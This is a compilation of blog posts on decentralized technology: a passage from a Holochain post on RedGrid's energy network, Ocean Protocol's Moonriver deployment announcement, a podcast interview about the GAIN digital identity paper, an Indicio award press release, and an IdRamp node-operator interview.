href="https://www.sciencedirect.com/science/article/pii/S2666792420300068">logistical</a> <a href="https://cse.buffalo.edu/faculty/tkosar/cse710_spring19/shi-iot16.pdf">challenge</a> for cloud computing, which (despite its fluffy name) happens in faraway data centres. It’s going to be hard for the cloud to keep up. (And I ought to point out that it has its own <a href="https://www.masonandhanger.com/blog/data-center-energy-consumption/">ecological problems</a> too).</p> Where Holochain comes in <p>This is the Holochain Blog, after all, so I ought to mention it. Why did RedGrid build the IOEN on Holochain? The way Mike explained to me, it’s because Holochain is built for decentralisation.</p><p>And I’m not talking about the sort of decentralisation you see in blockchain. It’s a marvellous feat of engineering with some compelling use cases, but <a href="https://medium.com/@VitalikButerin/the-meaning-of-decentralization-a0c92b76a274">it’s still logically centralised</a>, according to Ethereum’s creator Vitalik Buterin.</p><p>In practice, that means that your smart devices need to be connected to the global blockchain network all the time. This demands an always-on internet connection with zero downtime — which is fine if that’s what you have, but it’s problematic if you’re part of the world’s majority who live with patchy power and internet.</p><p>First-generation blockchains are also unfit for tiny smart devices, and they consume a <a href="https://blog.holochain.org/satoshi-nakamoto-and-the-fate-of-our-planet-2/">massive amount of electricity for very little work</a> (although newer DLTs are addressing those problems). The solution shouldn’t contribute to the problem. Mike tells me that “we turned our backs on Ethereum years ago”.</p><p>Holochain was designed to <a href="https://developer.holochain.org/concepts/4_dht/#resilience-and-availability">tolerate</a> messy, unreliable connectivity. Far from being an anomaly, this may become increasingly common. During our local wildfire season, one fire <a href="https://www.castanet.net/news/West-Kelowna/340081/Disaster-has-been-averted-for-now-Brenda-Creek-fire-skirts-past-BC-Hydro-transmission-lines#340081">nearly knocked out</a> power and internet for 60,000 people. This would not have been a problem for an IOEN-powered local grid.</p><p>Holochain’s creators <a href="https://blog.holochain.org/energy-as-a-currency-holochain-and-sustainable-energy/">built it for edge computing</a> in the extreme. Every device carries its own weight, according to its ability. It <a href="https://developer.holochain.org/concepts/3_source_chain/">stores its own data</a>, makes its own decisions, connects directly to neighbouring devices, and helps <a href="https://developer.holochain.org/concepts/4_dht/">support the health</a> of the local network. This lets the computing capacity scale linearly with the number of participants. And less powerful devices will soon be able to offload their work to a <a href="https://holo.host">decentralised cloud</a> if needed.</p><p>Mike and his colleagues also appreciated that Holochain already had a small but strong developer community. In preparation for an IOEN demo for their partner Monash University, Holochain developers from around the world <a href="https://blog.holochain.org/building-together-redgrids-internet-of-energy-mission-and-the-holochain-community/#strength-in-a-band-of-allies">rallied around RedGrid</a> to make it happen. After the demo, Mike <a href="https://youtu.be/BYcpuKBRIEs?t=2393">said</a>:</p><blockquote>“I should point out that what attracted me to Holochain was the support, not so much the tech. And it’s just in the last month that this has proven out, with Guillem and Connor [and Alfredo, Jesús, and Eduardo] helping us… You can see in GitHub and Discord their discussions with David Meister and Tom Gowan [Holochain core devs], to the point where a community dev actually found things and updated the core. It’s really pretty impressive. And Monash recognised that.”</blockquote><p>Adam agreed, <a href="https://youtu.be/BYcpuKBRIEs?t=2426">saying</a>,</p><blockquote>“And that was really cool, because you’re building together. For us as a company, we’ve had lots of good support from Art [Brock] and Eric Harris-Braun [Holochain co-founders] from the beginning, and obviously other people Mike mentioned... It makes us feel good—about the community, about the whole mission, and also there are other people out there who are not building on Holochain but believe in what we’re doing, the Holochain/RedGrid combination.”</blockquote> Where you come in <p>When we’re faced with the stark challenge of climate change, and the apparent <a href="https://www.theguardian.com/environment/2021/sep/28/blah-greta-thunberg-leaders-climate-crisis-co2-emissions">inaction</a> of the people who make decisions, it’s easy to fall into discouragement. Many of us are desperate to see change, but feel powerless to actually make the change happen. We would seize any opportunity to get our agency back, to help guide our world towards a happy future.</p><p>And we technologists have often found ourselves part of the problem rather than the solution. But projects like this remind me that there is a place for appropriate applications of technology, <a href="http://worrydream.com/ClimateChange/">there is a role for people</a> who can design, program, build, tinker, and tweak. We can “create options for policy-makers”, in the words of Saul Griffith. And when they ignore those options, we can step around them and build tools for everyone — tools for <a href="https://medium.com/metacurrency-project/a-compass-for-a-life-affirming-economy-328ab09e1a87">coordination</a>, tools to <a href="https://www.artbrock.com/2020/07/29/currencies-are-records-of-currents">make the invisible visible</a>. Tools to help us make sense of our world and take action together.</p>

<p>Ocean Protocol smart contracts and Ocean Market are on the leading EVM Kusama Parachain, to unlock the Web3 Data Economy for the Polkadot ecosystem</p><p>As part of Ocean’s<a href="https://blog.oceanprotocol.com/oceans-on-ethereum-mainnet-ba9be1aee0ce"> multi-chain strategy</a>, we have deployed Ocean’s technology to <a href="https://moonbeam.network/networks/moonriver/">Moonriver</a>.</p><p>Moonriver is the leading EVM-compatible chain in the Kusama / Polkadot ecosystem. This gives it excellent security and cross-chain interoperability that will continue to&nbsp;improve.</p><p>Moonriver is a parachain (sub-chain) that leverages Kusama relay chain (parent chain) security. It’s a sister to the upcoming Moonbeam chain, a parachain to Polkadot relay chain. Kusama targets rapid testing and long-tail applications, whereas Polkadot targets slower large-enterprise applications.</p><p>Moonriver went live on Aug 26, 2021. Its traction is already impressive: within three weeks, <a href="https://cryptoslate.com/kusama-dapp-moonriver-records-1-million-transactions-in-just-3-weeks/">it hit </a>1 million transactions and 100K wallet addresses. A week and a half later, the <a href="https://blockscout.moonriver.moonbeam.network/">transactions had doubled to 2 million</a>. It has more than <a href="https://defillama.com/chain/Moonriver">$200M staked in DeFi applications</a> and another <a href="https://moonriver.subscan.io/">$270M bonded in collator staking</a>, excellent for any network, let alone such a young&nbsp;one.</p><p>The Ocean core team and Moonriver / Moonbeam core team (<a href="https://twitter.com/purestakeco">PureStake</a>) have been <a href="https://twitter.com/oceanprotocol/status/1353677332704329733">collaborating since January 2021</a>. In April, the Ocean core team deployed Ocean backend components and Ocean Market frontend to Moonbase Alpha testnet, then <a href="https://twitter.com/oceanprotocol/status/1387044024574373889">shared that work</a> in the Moonbeam #Illuminate21 community event. The teams worked closely to iron out small kinks. The Ocean deployment to Moonriver is the first major technology milestone in this collaboration, and as part of the broader Ocean — Polkadot ecosystem.</p><p>Ocean and Polkadot have grown up together. The creators of Ocean (and before that BigchainDB and ascribe) and creators of Kusama / Polkadot have been collaborating since 2014-era Ethereum days through the founding of Parity (née Ethcore) and Web3 Foundation, from security audits to go-to-market strategy, and always with an eye towards technology integration.</p><p>In 2017, Ocean founder Trent McConaghy presented “The Web3 Data Economy” vision at the inaugural Web3 Summit conference, hosted by Web3 Foundation [<a href="http://trent.st/content/20181022.2%20Web3%20Summit%20-%20McConaghy.pdf">slides</a>][<a href="https://www.youtube.com/watch?v=sKbVieQ_foo">video</a>][<a href="https://blog.oceanprotocol.com/the-web3-data-economy-b6fd8ecac4c4">blog post</a>]. The Ocean Moonriver deployment makes this vision real in Web3 Foundation ecosystem.</p><p>Moonriver is fully Ethereum-compatible, which allows it to run Ethereum smart contracts and use Ethereum-style ERC20 tokens. It’s a Proof-of-Stake chain with a modern consensus algorithm built on <a href="https://www.parity.io/technologies/substrate/">Parity Substrate</a> technology. This allows it to have low gas fees and low latency compared to Ethereum&nbsp;mainnet.</p>The <a href="https://market.oceanprotocol.com/asset/did:op:Fdc8aDac3F2869855dF069ED3D3604BF630701aD">first dataset published in Moonriver</a>.<p>With Ocean deployed to Moonriver, this&nbsp;means:</p>  Users of<a href="http://market.oceanprotocol.com"> Ocean Market</a> can publish, swap, stake, and consume data assets in Moonriver.

 Podcast transcript 
<p>Let’s Talk About Digital Identity, the podcast connecting identity and business. I am your host, Oscar Santolalla.</p>
<p>Oscar Santolalla: Hello, and thanks for joining. Our guest today played a leading role editing a paper published by more than 150 identity experts. The paper is called GAIN: How Financial Institutions are taking a leadership role in the Digital Economy by establishing a Global Assured Identity Network. It was announced at the European Identity and Cloud Conference last 13th of September by Nat Sakimura, who is the Chairman of the OpenID Foundation, and Gottfried Leibbrandt, former CEO of Swift, and then was published by, among others, the Institute of International Finance.</p>
<p>Our guest today is Elizabeth Garber. She is a customer and product strategist who started her career in telecommunications and honed her craft in six different industries before joining one of the world’s largest retail banks. She is an expert in designing experiences and delivering transformational change based on a deep understanding of people. This interest has underpinned her graduate studies of the psychology of cross functional teams, as well as how customers define value in relation to the services they use.</p>
<p>In 2015, she was named one of the top three marketers under 30 by the UK Marketing Society, and was recognised by Energy UK and EY for her work building trust across the UK energy industry. In 2017, she won the Financial Times 30% club Women in Leadership Award.</p>
<p>Hello, Elizabeth.</p>
<p>Elizabeth Garber: Hello, thanks for having me.</p>
<p>Oscar: It’s a pleasure. Welcome to our show. And let’s talk about digital identity. And certainly, we always like to start hearing a little bit more about our guest, especially how was your journey into this world of digital identity. Please tell us a bit about yourself.</p>
<p>Elizabeth: Sure. So my name is Elizabeth Garber. As you said, I’m a customer strategist, a product owner and service innovator. Now, I’m also a digital identity evangelist, I suppose. My passion is for understanding people, what drives their behaviour, how does any kind of service really add value in their lives. Then I help organisations to build services and communicate those benefits to real people. So these skills, I think, are critical in the digital identity space, because the solutions that we design really need to reflect the people who use them, how they move through their worlds, globally.</p>
<p>And not only that, but really great customer experience, designers, product owners, they’ll get to know what’s really on people’s mind that might prevent adoption of any one solution. And how different solutions kind of destroy value maybe in sometimes insidious ways, like a really convenient identity solution could come with some real trade-offs that are invisible to users at first. Maybe their data isn’t secure, maybe it’s sold off, maybe they’re giving it willingly, but they’re blind to some of the applications that will follow.</p>
<p>As someone who hasn’t been involved in identity for all that long, I can really relate to the users who don’t understand the difference between the offers that are currently on the market, and what might be there in future. So I’m here to get underneath how our identity solutions are going to create and potentially undermine benefits for real people. And then I want to promote the adoption of good ethical solutions.</p>
<p>Oscar: Excellent. And what was your exact role in this project in this paper, GAIN?</p>
<p>Elizabeth: In the paper?</p>
<p>Oscar: Mm-hmm.</p>
<p>Elizabeth: Yeah, as it turned out, a few other people thought that I could be useful. So one of the early co-authors Rod Boothby, who chairs the Open Digital Trust Initiative at the Institute of International Finance, reached out to me about his work. I was really floored when he took me through it and I knew that I wanted to get involved. It was really exciting. So, after I read through some of the documentation, I sent him some thoughts about the value to users, to banks, to relying parties.</p>
<p>And then within a few days, I was facilitating a virtual whiteboard session with a lot of the other co-authors all over the world, trying to help them kind of coalesce around who the paper was for, who is the audience, what are the messages that are going to resonate with that audience and then the structure of the paper. At that point, I wondered if someone might realise that I didn’t have a huge background in identity, maybe kick me out, but they are an inclusive group of people, and they really valued the approach. So ultimately, I played a pretty big role in pulling the paper that we published together.</p>
<p>I should say who else was involved. It was really an experiment in radical democracy as Don Thibeau of the OpenID Foundation likes to say. We brought more than 150 people together, experts in the space. I might mention some of their names in this interview, but it was a pro bono, no logos collaboration. But we did have the support of some major organisations in the space. The ones that participated and are now publishing and promoting the paper include the OpenID Foundation, the Institute of International Finance, the Open Identity Exchange, the Global Legal Entity Identifier Foundation, and the Cloud Signature Consortium.</p>
<p>Oscar: Excellent. Tell us a bit more about the…</p>
<p>Elizabeth: The paper itself?</p>
<p>Oscar: Yes, please.</p>
<p>Elizabeth: OK. Yeah, sure. So the paper invites financial institutions. It’s a call to action for financial institutions to join us in solving the biggest problem on the internet – a lack of trust, specifically a lack of trust due to the absence of verified identities. How do you know the person you’re dealing with is real? How do you know that they are who they claim to be? How do you know that your money will end up in the right hands? Fraud and cybercrime increases every year. Some estimates say it’s 5% of GDP, trillions of dollars. Criminals are thriving in anonymous digital spaces.</p>
<p>And at the same time, you and I and our friends are pervasively tracked. We enter our details into countless sites, service providers follow us around, they trade our information. Even our biometrics are seeping around into more and more places, our faces, our fingertips, more and more people or parties have access to really private, really personal information that could be used in any number of ways – steal our identities, for example. And that needs to stop.</p>
<p>The paper argues for the internet’s missing trust layer. That’s a phrase coined by one of the co-authors, Kim Cameron, who led identity at Microsoft for many years, and he wrote the Laws of Identity. Then this concept was really beautifully explained by Nat Sakimura, Chairman of the OpenID Foundation at the European Identity and Cloud Conference in September. In this new paradigm, highly trustworthy identity information is passed from a regulated or otherwise highly trusted institution to an organisation that needs it, with end user knowledge and consent every time.</p>
<p>So, if I’m buying another bottle of Malbec, I shouldn’t have to prove my age by uploading a driver’s license to another site or sharing a photo of my face. You don’t need my name, my face, my address. No one else needs a copy of my credentials or biometric information. You just need to know that I am the person I say I am and that I’m old enough. So my online wine retailer can send a message to my trusted identity information provider. I would choose my bank and they will use their app to authenticate me and say, “Hey, the International House of Malbec wants to know if you’re over 21, should I tell them?” And of course, it’s a yes, because I need to celebrate recording this podcast.</p>
<p>Oscar: Tell us a bit the solution itself because there are some solutions, which one way or another address the problem you described?</p>
<p>Elizabeth: Yeah, so none of this is really new. People have called for this for years. One of my co-authors actually from INNOPAY, Douwe Lycklama, shared a YouTube video arguing for the same thing, and it was dated in 2007. Of course, it does exist in some places already, Norway, Sweden, Belgium, Canada, Finland, in one form or another lots of jurisdictions around the world have a solution like this. And as another GAIN co-author Dave Birch, who also wrote Identity is the New Money, pointed out in Forbes last week – We’re starting to see evidence that these networks really facilitated the rollout of aid during the pandemic, and mitigated the risk of fraud.</p>
<p>In particular, another co-author from Vipps in Norway helped us to compare some early information coming out against the US, UK data. So no, none of its new but we do argue in the paper that now is the time to think about global interoperability of these networks.</p>
<p>Oscar: Yeah, and I think as the model of doing the solving these problems goes towards how the countries you have mentioned, most of them have created a system based on banks, others combined with all of the mobile operators, right, but those are like the main types. And the states, of course, the states, some of the states has also provided that. So these are the three types of identity provider, the one who provision these systems, this identification service, but obviously, it’s not – it’s not commercial big tech, no, that’s out of these group of entities who provide these systems.</p>
<p>And of course, you mentioned different countries. We talk about few countries that have sufficient solutions. But I think the next question would come, how to make it available for the rest of the world, how we ensure some type of global interoperability?</p>
<p>Elizabeth: Absolutely, absolutely. So we think global interoperability is really important for a lot of different reasons. Three in particular spring, to my mind. The number one, end users want to live globally, maybe more importantly, most online companies are global or need to be global. They have suppliers and customers across borders. So the benefits increase dramatically when a trust network is global, rather than local – fewer contracts, fewer integrations, and the benefits extend throughout their supply chains all the way to the end users who benefit from simpler, more convenient services all across the internet.</p>
<p>Because my second point is, it’s an extension of that first one that those benefits actually extend to global society. A global network allows a specialist artisan in one part of the world to reach a global audience without relying on an intermediary. So Oscar, let’s say you have something to celebrate, and you’ve decided to buy yourself a handmade quilt from India, a Kantha. You will be able to find sellers that you can trust and they’ll be able to sell to you, charge you the price that someone in Finland expects to pay, and they will keep a greater percentage of it for themselves, potentially. So this is really going to unleash creativity and expand access to individuals and communities and sellers all around the world.</p>
<p>Finally, there’s a practical benefit from promoting this vision of interoperability. And I believe it’s the key factor that will move the needle towards actually setting up this trust layer in places where it does not exist today. Major relying parties, and I’m talking now about big companies that operate worldwide with the heft to influence a global movement, they buy into this vision only when it has a global reach. They don’t want to integrate with a different provider in every jurisdiction on the planet. So with that in mind, financial service institutions around the world are far more likely to collaborate and catalyse this movement, if they see that the vision is expansive enough to meet the demand for global reach.</p>
<p>Oscar: Okay, so definitely interoperability is something that we aim – not only the ones who are like me, I’m in Finland would like to have the same for the rest, but the ones who don’t have a sufficient identification system like those. But then something caught my attention is in the white paper. It says GAIN Digital Trust: How financial institutions are taking a leadership, et cetera, et cetera. So that means that the 100 persons who have been involved in this are targeting financial institutions. So why is targeting specifically financial institutions?</p>
<p>Elizabeth: Great question. So the main body of the paper is targeting, it’s directed at the world’s large financial institutions. It’s a call to action for them to catalyse the creation of a globally interoperable network. To be really, really clear with everybody though, we don’t think the paper or the global assured identity network is only for banks or financial institutions. The network itself must be inclusive, and in some parts of the world energy companies, telecommunications providers etc., they may be better placed than banks to be trusted identity information providers.</p>
<p>However, we argue that financial institutions are really well positioned to spark this change, to bring it to life, and to benefit from it. And so that’s what the paper really gets into. It runs through the reasons why financial institutions are positioned to do it – a point we repeat a few times – because we’ve seen them do it before. They built the rails for global payments, for cards, for securities, etc. They built Swift, Mastercard, Visa.</p>
<p>There are three main strengths that they have that makes them the perfect catalyst. Number one is trust. It’s a bank’s core offer. I know some people might laugh at that, because you don’t always trust a bank to give you the best rates, or brilliant customer service every time, but you do trust them. You trust them to keep your money and your data safe. That’s why they exist. Some companies monetise your data. Banks, financial institutions are in the business of monetising your security and privacy. And they have been since the very first bank – the Medici bank in 1397. Banks are trusted.</p>
<p>Number two, the second point, is a build off the first. They are regulated. A lot of that trust is underpinned by regulation. They need to be worthy of our trust and meet certain standards so that other businesses do not – and there are governance frameworks to build upon as these new services are created.</p>
<p>The third point that makes them a great catalyst, the third strength, is how well they know their customers. Because of those first two things, banks invest significant amounts of money in making sure that they know their customers. You might hear me say Know Your Customer, or KYC, is the process – and it’s regulated – that they go through to validate your identity when you open an account. And they also build the technical infrastructure to know that it’s you each and every time someone tries to get into your account. They have built best-in-class tools to identify, authenticate you, while keep your account secure and your information private. And all that’s why banks are best placed to vouch for your identity and to use their authentication methods to confirm on behalf of others that it’s really you.</p>
<p>Oscar: What would make possible that there is such interoperability in more practical, more technical terms?</p>
<p>Elizabeth: Good question. So we’re going to try to apply interoperability standards that many different types of systems can plug into. There will be direct participants, banks or other identity information providers who use the network to verify information for the companies who need to consume it. And, of course, there will need to be intermediaries and translation layers to ensure that a BankID Sweden customer can verify their identity with a seller in Mexico, for example. That BankID customer will continue to verify using BankID. But we will have created a way for BankID to communicate to relying parties all over the world, including Mexico.</p>
<p>We can also create servers that tap into self-sovereign identity networks. It’s important to know that we’re designing this system so that identity information passes from the provider, the identity information provider, directly to the relying party without passing through any centralised GAIN entity. That’s really important, at least as we understand it. That’s really important when we start to talk about interoperability from a legal standpoint.</p>
<p>Technically speaking, though, these direct connections are enabled by common API specifications. They’re based on OpenID standards, such as FAPI. With all that said, this field is evolving and technical proof-of-concepts are underway. So I definitely need to reserve the right to build upon my answer later on.</p>
<p>Oscar: Yeah, definitely. It’s very convincing your point, your three points. And I can feel that, absolutely. And the banks have already proved that in some of the countries that we have mentioned that they are leaders in this identification.</p>
<p>Elizabeth: Absolutely. Yep.</p>
<p>Oscar: And now my guess that among the 150 authors, there are some people who are directly involved in banks.</p>
<p>Elizabeth: Mm-hmm.</p>
<p>Oscar: OK, excellent.</p>
<p>Elizabeth: Yes. Like I said, it was a no logo collaboration so I won’t be dropping the names of any specific names.</p>
<p>Oscar: Yes.</p>
<p>Elizabeth: But we did have the partnership of the Institute of International Finance, who is pulling together a proof of concept with the Open Digital Trust Initiative. And we do have banks involved in that.</p>
<p>Oscar: So why it is really good for banks from the bank’s point of view, why it’s good to join GAIN?</p>
<p>Elizabeth: Yeah, so importantly, it’s not just that they can do this, it’s also that they will benefit from doing it. The first benefit that’s easiest to explain is simple, it’s revenue. Identity verification services will have as they do today, a small price attached. Transactions will result in a small amount of money flowing into the ecosystem. And a percentage will go to the identity information provider, in this case, the bank. That turns the assets that I was just talking about – what they’ve spent to build up KYC, authentication, security, all those infrastructures – that turns them from a major cost centre, into a profit centre.</p>
<p>Second, there will be massive efficiencies for banks, password resets, document signing, mortgage processing, etc. There will be more efficiency inside a bank. They will also see less fraud. In Norway, BankID saw fraud reduced from something like 1% to 0.00042% of transactions.</p>
<p>But the biggest benefits are strategic. New competitors are coming in between banks and their customers, are diminishing the role that banks play in providing access to capital markets. Providing identity information services to their customers, under their brand name, cements a really critical role for banks. They will provide their customers with access to the digital economy. And they will keep their customers safer, more secure in their privacy than they are today. And that’s a real value add for their customers. So strategically, banks really must do this, or they risk getting cut out of a lot of transactions.</p>
<p>Oscar: Indeed, banks have to hear it. When I started reading more about this paper, and you have mentioned at the beginning also, that the Global LEI Foundation is also involved, it’s one of the main supporters of this initiative. So tell me how that relates to that. They are not the banks. Of course, they have some business with the banks. But please tell us what is the connection?</p>
<p>Elizabeth: Yeah, I listened to <a href="https://www.ubisecure.com/podcast/clare-rowley-gleif/" title="your podcast that you did with GLEIF, Global Legal Entity Identifier Foundation">your podcast that you did with GLEIF, Global Legal Entity Identifier Foundation</a>, while I was preparing to talk to you. And yeah, I think the connections are really strong. So they were a critical partner in pulling the paper together. They’re doing incredibly important work, and will absolutely be part of the next steps as we figure out how to realise a global assured identity network.</p>
<p>There are three types of identity questions that we all really have as we transact online. Who is this person? Can I trust them? Who is this company? Are they trustworthy? And then connecting the two. Is this person related to a company? What’s their role? Are they entitled to be doing this thing, signing this document logging into my account on the company’s behalf? If we start getting key information about the individual, that’s great, that adds a ton of value. GLEIF is answering that second question, who is the company? And once we can get to the third point of connecting the dots, that’s going to be really powerful. So yeah, GLEIF is a critical partner and will remain so throughout the rest of the journey.</p>
<p>Oscar: Yeah, yeah, now the way you have explained also is pretty good. And we say that verify identity of a person, of a company or organisation and how to link these two in this. And that’s pretty critical. That’s something that has not been explored enough, I would say. So that’s, I’m really intrigued to hear how GAIN is addressing doubts about this because it’s essential these days.</p>
<p>So, Elizabeth, I’d like to hear more what comes next. So just a couple of weeks ago was the launch of the paper and I also saw some interest on the media. That’s excellent to hear. But what come next now for GAIN?</p>
<p>Elizabeth: Well, we already have planning underway for GAIN technical proof of concept. And we’re looking for more people to get involved, more companies to participate. So we have big companies who need to de-duplicate their customers, companies that need to collect verified signatures, the number of use cases is seemingly endless. We’re also looking for partners, aggregators, or service providers who can help us – help bring these relying parties on board or technical service providers who can help us to envision and build services on top.</p>
<p>There are so many ways to be involved. So if you’re thinking about getting involved, it might mean that you’re interested in identity. So you’re listening to this podcast after all, that probably means that you’re only one or two steps away from one of the co-authors, so it’d be really easy for you to reach out to them. You can also reach out to me or the <a href="https://www.linkedin.com/groups/12559000/">Global Assured Identity Network LinkedIn group</a> that we have. And if you’re really interested in the POC, we’ve got an email address for you, it would be <a href="mailto:digitaltrust@IIF.com">digitaltrust@IIF.com</a>. So even if none of that is true for you, there’s something you can do. You could call up your bank and tell them to offer this service</p>
<p>Oscar: Exactly. Even as a user, you can ask your customer for the bank, you can ask the bank, have you heard of GAIN? Yeah, absolutely. And I guess – assume that you already have a big list of the most potential use cases right that some of these customers, companies, service provider that you are now inviting. They could fit into this use cases. Excellent. Elizabeth, finally, tell us – for all business leaders that are listening to us in this interview. So what would you say is the one actionable idea that they should write on their agendas today?</p>
<p>Elizabeth: So these ideas that we’ve been talking about are going to mark a step change in the digital economy. A third wave in identity as my colleague Rod Boothby pointed out on LinkedIn last week. First, it was all about companies providing IDs and passwords to employees to access work systems, and businesses gave customers IDs and passwords to access services on the internet. This third wave is all about us bringing our own trusted digital identity wherever we go. With a really inclusive approach and active global collaboration, this will open up our digital economy. It’s going to expand access, and make life so much simpler and safer online.</p>
<p>So for those who are listening, I would urge business leaders to figure out what role your business can and will play in a globally interoperable assured identity network. Are you an identity information provider? Can you be? Will you be a relying party who consumes these services so that you can verify that the signature on a contract is valid? Can you help us onboard relying parties or integrate these services?</p>
<p>On your agenda, I’d say write down, figure it out, figure out how you’re going to get involved and then get in touch. Again, join our Global Assured Identity Network on LinkedIn, or email <a href="mailto:digitaltrust@IIF.com">digitaltrust@IIF.com</a>. If you know that you want to join the POC.</p>
<p>Oscar: Yeah, indeed. This might still be relatively new concept for companies who are not so exposed to this type of identity services. So yeah, it’s a good idea, as you said, to decide, think about what is going to be that new role of your company from the many choices you have mentioned.</p>
<p>Thanks a lot, Elizabeth. It was super interesting to hear about this extraordinary effort that had been done by GAIN project, very recently launched. And as you said, now, the Proof-of-Concept are starting to keep going. Please let us know how people could get in touch with you if they like to follow this conversation with you.</p>
<p>Elizabeth: Yeah, so you can find me on <a href="https://www.linkedin.com/in/elizabethgarber/">LinkedIn</a> really easily. My name is Elizabeth Garber. Yeah, I think that’s the easiest way.</p>
<p>Oscar: OK. LinkedIn is the easiest way. Thanks a lot Elizabeth. It was a pleasure talking with you and all the best.</p>
<p>Elizabeth: Thank you. Thanks for having me.</p>

				  Ken Ebert nominated in Blockchain Leadership Award category for vision and leadership in developing interoperable blockchain-based Trusted Data Ecosystems  
			  
				
				
				 <p>SEATTLE — October 05, 2021 — <a href="https://indicio.tech/">Indicio</a>, the world’s leading provider of decentralized identity and hosting solutions, today announced that company Chief Technology Officer Ken Ebert has been named as a finalist in the Blockchain Leadership Award category in the <a href="https://blockchainrevolutionglobal.com/the-eb-awards/">Enterprise Blockchain Awards</a> (EBAs) presented by the <a href="https://www.blockchainresearchinstitute.org/enterprise-blockchain-awards/">Blockchain Research Institute</a>. Ebert was recognized for his long-lasting vision for open-source identity technology anchored on a blockchain network to solve some of our most pressing online problems—verification, privacy, security, and user experience.</p>
<p>Ebert was one of the co-founders of Indicio.tech, and he has been pivotal in nurturing it from its launch at the start of the COVID pandemic to its position today as the global leader in developing decentralized identity infrastructure and software for building Trusted Data Ecosystems. He built a virtual team of highly-skilled developers that is diverse in gender and nationality, and he developed an intern and mentoring program to create the needed skills in new recruits as the company took on more and more customers’ projects.</p>
<p>With Ebert’s team-focused leadership, Indicio was able to successfully create and deploy a complete decentralized identity based data ecosystem, weaving together health agencies, global technology suppliers in the travel industry, and national governments. The company’s continuing success reflects on Ebert’s&nbsp; extraordinary ability to bring parties together and drive ideas and projects forward into workable technology that solves real-world problems. And, as a passionate advocate for interoperability in the open-source identity communities, Ebert isn’t just driving Indicio’s success, he’s helping to drive the adoption and evolution of blockchain technologies that promise transformative change and opportunity for everyone.</p>
<p>“Indicio’s success and its position as a global leader in the development of Trusted Data Ecosystems is a testimony to Ken’s seemingly boundless skill and wisdom. It’s not just his ability to analyze and clarify problems and guide our own team, it’s his tireless capacity to do so for all the companies who support the Indicio Network as well as our customers,” said Heather Dahl, CEO, Indicio. “That’s what makes him an outstanding leader. Part of that comes from character; part from experience; but a part of it is also a philosophy of ‘build now, build more, build better.’&nbsp; When you think about the problems we’re trying&nbsp; to solve, they’re huge. Ken is always the one to remind us—and our collaborators and customers—that we build solutions step by step. Let’s solve this bit first. And when you do this, and do it relentlessly, you’ll feel like you’re running and you can achieve anything.”</p>
<p>“I want to thank BRI for its dedication to helping enterprise leaders understand and implement blockchain within their industries. This is a technology that has&nbsp; enormous potential to rewrite the way we do so many things in business and society,” said Ebert. “It’s exciting to be the CTO of a company that is driving that transformation through the Indicio Network—a distributed blockchain for identity—and through designing solutions that give people the ability to prove identity and share data in a way that preserves their privacy, in&nbsp; a way that improves their security, and, above all, in a way that can be trusted. All this would be impossible without blockchain. I’m honored to be a finalist for this award;&nbsp; but I’m more excited by what we—Indicio, our clients, the identity community—can do for the world with this technology. That’s the excitement that greets me every day—and I want to share it with everyone.”</p>
<p>The Blockchain Leadership awards honor people who have shown exceptional leadership in a blockchain collaboration or implementation within an enterprise, an industry, a government, or a multi stakeholder organization. The nominees are those that have gone above and beyond the job description to spearhead blockchain initiatives within an enterprise or ecosystem.</p>

				 <p>A distributed ledger is a database that has copies distributed across a network of servers (nodes), all of which are updated simultaneously. A network like this is the foundation of decentralized identity, a way of generating robust trust and collaboration free of the security risks of centralized databases. We call the companies and organizations that support an Indicio Network node on a server that is under their control “Node Operators.”&nbsp;</p>
 
<p>Recently we caught up with Karl Kneis, COO of IdRamp, and Eric Vinton, Chief Business Officer of IdRamp, one of the first companies to become an Indicio Node Operator, to discuss their current projects, some goals for the future, and where they think decentralized identity is heading.</p> 
			  
				
				
				 <p>Tell us about IdRamp: how did it start, where did it start, and who makes up your team?</p>
<p>IdRamp was born from years of frontline experience in enterprise identity management and service delivery. With IdRamp we wanted to reduce the pain and vulnerabilities that surround digital identity passwords, platform migration, operation, and service delivery.<br><br>The cost and resource requirements of managing and replacing identity platforms can be astronomical. Operation requires special skills and complex customization. Migrations can take years to complete and often fail. Service delivery can be slow and require premium resources. — Our experience found that adapting decentralized, Zero-Trust identity principles will reduce cost while increasing security and accelerating the speed of service delivery.<br><br>We founded IdRamp to help remove passwords, automate expensive tasks, reduce the need for advanced skills, and simplify the adoption of new solutions, all while improving overall security through decentralized Zero Trust. Instead of reinventing identity management platforms every few years with mammoth projects, organizations can use Idramp to enjoy continuous adoption of new services and solutions at the speed of business.&nbsp;</p>
<p>Decentralized verifiable credentials can easily be adapted to any service or system for advanced Zero-Trust protection and password elimination. No coding or long term platform projects are required. People appreciate the improved privacy and simplified experience of passwordless ecosystems. Security authorities appreciate the reduced data liability and the stronger protection of Zero Trust credentials.</p>
<p>Our team’s deep experience working through generations of multinational digital identity projects gives IdRamp a unique perspective. We excel at solving complex problems with simple effective solutions that improve the bottom line.</p>
<p>What are some of the products/services (Self Sovereign Identity or not) that you currently offer? Who are your target customers? What sets you apart from the competition?</p>
<p>Our premier product is the IdRamp platform. It caters to the public sector, enterprise and SMB customers across all industries. It provides service orchestration with zero-trust decentralized identity, and password elimination.</p>
<p>While IdRamp is a zero-code solution we also provide robust APIs that can be used to extend&nbsp;</p>
<p>capabilities into any custom application or ecosystem experience. The APIs offer a limitless palette of design opportunities for application development.</p>
<p>We also provide a free digital identity wallet to securely share personal information, such as education certifications, health data, or employment credentials. The wallet provides multi-wallet stewardship capabilities that allow people to manage credentials for other people or things.This feature can be used to manage family credentials, or eldercare use cases, for example.</p>
<p>IdRamp is built on open standards for interoperability. It operates automatically across any standards-based digital identity network. While the IdRamp wallet offers robust capabilities, any standards based identity wallet can be used with the IdRamp suite of tools.</p>
<p>Recently, we co-developed a series of groundbreaking IdRamp-based apps with security software provider <a href="https://bak2.life/">Bak2.life</a>. These apps include:</p>
 
 Bouncer Zoom Event Attendee Security — extends Zoom meeting security with email 2FA or verifiable credentials for all participants. 
 Return to Life — provides a simple way for organizations to offer safe access to events and facilities based on verifiable health credentials, digital ticketing or custom credentials tailored to business needs.  
 Webcast Security Portal — provides end-to-end protection and access control for multiple webcast providers, including Zero-Trust, passwordless verifiable credentials. 
 
<p>What motivated your work in decentralized identity? Why did you become a node operator?&nbsp;</p>
<p>Decentralized identity reduces data liability, increases privacy, improves security, and human experience. It is a natural compliment to our suite of Zero-Trust passwordless solutions. Decentralized design has always been core to the Idramp strategy. Adapting new standards in decentralized identity helps our customers achieve the best possible protection across their ecosystems.</p>
